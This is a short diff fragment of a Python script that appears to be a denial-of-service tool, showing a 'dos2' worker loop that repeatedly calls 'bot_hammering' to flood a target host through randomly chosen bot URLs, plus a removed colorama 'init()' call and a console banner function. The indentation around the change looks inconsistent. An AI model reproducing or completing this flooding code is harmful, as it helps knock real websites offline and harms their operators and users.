@@ -75,8 +75,6 @@ def dos2():
 		item=w.get()
 		bot_hammering(random.choice(bots)+"http://"+host)
 		w.task_done()
-		
-					init()
 
 					def console_picture():
 					   print(Style.BRIGHT + Fore.YELLOW)
